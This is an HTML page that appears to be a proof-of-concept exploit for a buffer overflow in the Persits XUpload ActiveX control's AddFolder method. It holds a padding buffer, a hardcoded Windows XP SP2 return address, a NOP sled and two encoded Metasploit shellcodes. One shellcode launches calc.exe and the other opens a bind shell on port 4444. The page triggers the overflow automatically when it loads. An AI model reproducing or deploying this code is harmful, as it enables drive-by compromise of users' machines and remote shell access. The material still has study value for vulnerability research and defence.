<html>
<head>
<title>Persits Software XUpload Control AddFolder BoF Exploit</title>
<script language="JavaScript" defer>
  function Check() {

   var buf = 'A'; while (buf.length <= 1387) buf = buf + 'A';


// win32_exec -  EXITFUNC=seh CMD=c:\windows\system32\calc.exe Size=378 Encoder=Alpha2 http://metasploit.com
var shellcode1 = unescape("%eb%03%59%eb%05%e8%f8%ff%ff%ff%49%49%49%49%49%49" +
                        "%48%49%49%49%49%49%49%49%49%49%49%49%51%5a%6a%43" +
                        "%58%30%42%31%50%42%41%6b%42%41%53%42%32%42%41%32" +
                        "%41%41%30%41%41%58%50%38%42%42%75%48%69%6b%4c%4d" +
                        "%38%63%74%75%50%33%30%67%70%4c%4b%73%75%57%4c%6e" +
                        "%6b%63%4c%45%55%63%48%33%31%58%6f%6c%4b%70%4f%77" +
                        "%68%6e%6b%73%6f%71%30%65%51%6a%4b%72%69%4e%6b%36" +
                        "%54%4e%6b%45%51%4a%4e%46%51%6b%70%4f%69%4c%6c%6e" +
                        "%64%59%50%73%44%53%37%58%41%7a%6a%54%4d%33%31%78" +
                        "%42%48%6b%7a%54%77%4b%52%74%66%44%34%44%62%55%59" +
                        "%75%6e%6b%41%4f%36%44%45%51%6a%4b%53%56%4c%4b%46" +
                        "%6c%72%6b%4c%4b%53%6f%37%6c%63%31%6a%4b%4e%6b%75" +
                        "%4c%6c%4b%54%41%48%6b%4d%59%51%4c%51%34%34%44%4a" +
                        "%63%30%31%6f%30%62%44%4e%6b%71%50%54%70%4b%35%6b" +
                        "%70%50%78%46%6c%6c%4b%63%70%44%4c%4c%4b%44%30%35" +
                        "%4c%6e%4d%6c%4b%61%78%55%58%6a%4b%64%49%4e%6b%6b" +
                        "%30%6c%70%57%70%57%70%47%70%4c%4b%70%68%47%4c%71" +
                        "%4f%44%71%6b%46%33%50%66%36%4f%79%4c%38%6e%63%4f" +
                        "%30%71%6b%30%50%41%78%58%70%6c%4a%53%34%51%4f%33" +
                        "%58%4e%78%39%6e%6d%5a%46%6e%61%47%4b%4f%69%77%63" +
                        "%53%45%6a%33%6c%72%57%30%69%50%6e%62%44%70%6f%73" +
                        "%47%41%63%41%4c%50%73%42%59%31%63%50%74%65%35%70" +
                        "%6d%54%73%65%62%33%6c%30%63%41%71%70%6c%53%53%66" +
                        "%4e%31%75%74%38%70%65%77%70%43");

// win32_bind -  EXITFUNC=seh LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com
var shellcode2 = unescape("%eb%03%59%eb%05%e8%f8%ff%ff%ff%49%49%49%49%49%49" +
                        "%49%49%49%49%49%49%49%49%49%49%37%49%51%5a%6a%43" +
                        "%58%30%42%31%50%41%42%6b%41%41%53%41%32%41%41%32" +
                        "%42%41%30%42%41%58%50%38%41%42%75%78%69%4b%4c%72" +
                        "%4a%58%6b%52%6d%4a%48%4a%59%6b%4f%6b%4f%69%6f%41" +
                        "%70%4e%6b%52%4c%74%64%41%34%6e%6b%37%35%55%6c%4c" +
                        "%4b%71%6c%64%45%61%68%74%41%6a%4f%6e%6b%62%6f%32" +
                        "%38%6c%4b%33%6f%37%50%55%51%78%6b%31%59%6c%4b%50" +
                        "%34%6e%6b%46%61%68%6e%45%61%6f%30%6c%59%6c%6c%6b" +
                        "%34%39%50%41%64%37%77%68%41%69%5a%56%6d%63%31%4b" +
                        "%72%78%6b%6c%34%75%6b%56%34%31%34%57%58%54%35%6b" +
                        "%55%6e%6b%33%6f%55%74%74%41%78%6b%41%76%4c%4b%46" +
                        "%6c%62%6b%6e%6b%41%4f%35%4c%56%61%68%6b%66%63%36" +
                        "%4c%6c%4b%6b%39%72%4c%44%64%57%6c%61%71%4f%33%47" +
                        "%41%6b%6b%33%54%4c%4b%63%73%70%30%6c%4b%53%70%64" +
                        "%4c%6c%4b%72%50%45%4c%4e%4d%6c%4b%37%30%75%58%73" +
                        "%6e%42%48%4c%4e%52%6e%46%6e%58%6c%56%30%39%6f%58" +
                        "%56%71%76%46%33%72%46%63%58%30%33%70%32%33%58%54" +
                        "%37%52%53%45%62%51%4f%50%54%4b%4f%5a%70%33%58%6a" +
                        "%6b%68%6d%59%6c%45%6b%46%30%49%6f%59%46%73%6f%4e" +
                        "%69%58%65%73%56%4d%51%58%6d%36%68%64%42%72%75%72" +
                        "%4a%67%72%59%6f%6e%30%72%48%4a%79%56%69%6b%45%6e" +
                        "%4d%76%37%6b%4f%58%56%33%63%30%53%50%53%76%33%70" +
                        "%53%33%73%53%63%37%33%56%33%6b%4f%5a%70%32%46%50" +
                        "%68%35%41%71%4c%30%66%33%63%6c%49%6d%31%6a%35%70" +
                        "%68%6e%44%35%4a%52%50%4b%77%71%47%4b%4f%4e%36%30" +
                        "%6a%52%30%31%41%70%55%59%6f%6e%30%30%68%6c%64%4c" +
                        "%6d%54%6e%79%79%31%47%59%6f%59%46%46%33%66%35%6b" +
                        "%4f%58%50%63%58%4b%55%73%79%4c%46%41%59%63%67%4b" +
                        "%4f%78%56%76%30%53%64%41%44%33%65%79%6f%4e%30%4e" +
                        "%73%71%78%58%67%61%69%69%56%71%69%62%77%39%6f%6a" +
                        "%76%51%45%49%6f%4e%30%51%76%53%5a%71%74%72%46%62" +
                        "%48%30%63%30%6d%6c%49%5a%45%63%5a%62%70%76%39%31" +
                        "%39%58%4c%4e%69%4d%37%53%5a%33%74%4e%69%4b%52%56" +
                        "%51%4b%70%6c%33%6f%5a%49%6e%33%72%44%6d%6b%4e%37" +
                        "%32%76%4c%6e%73%6c%4d%70%7a%76%58%6c%6b%4e%4b%4c" +
                        "%6b%73%58%53%42%79%6e%6d%63%74%56%6b%4f%30%75%70" +
                        "%44%4b%4f%79%46%53%6b%70%57%70%52%71%41%50%51%42" +
                        "%71%41%7a%33%31%42%71%41%41%51%45%66%31%69%6f%5a" +
                        "%70%50%68%6e%4d%5a%79%56%65%68%4e%33%63%39%6f%58" +
                        "%56%63%5a%4b%4f%4b%4f%70%37%4b%4f%4a%70%4c%4b%61" +
                        "%47%6b%4c%4d%53%6b%74%31%74%49%6f%59%46%70%52%59" +
                        "%6f%4e%30%63%58%6c%30%6f%7a%57%74%61%4f%32%73%4b" +
                        "%4f%68%56%39%6f%38%50%43");


		var eip = unescape("%2B%1C%E1%77"); //advapi32.dll Windows XP SP2 0x77E11C2B call esp

		var nop = unescape("%90%90%90%90%90%90%90%90%90%90%90%90");

		var m = buf + eip + nop + shellcode1;

		obj.AddFolder(m);

 }

 </script>
</head>
<body onload="JavaScript: return Check();">
  <object id="obj" classid="clsid:E87F6C8E-16C0-11D3-BEF7-009027438003">
   Unable to create object
  </object>
</body>
</html>

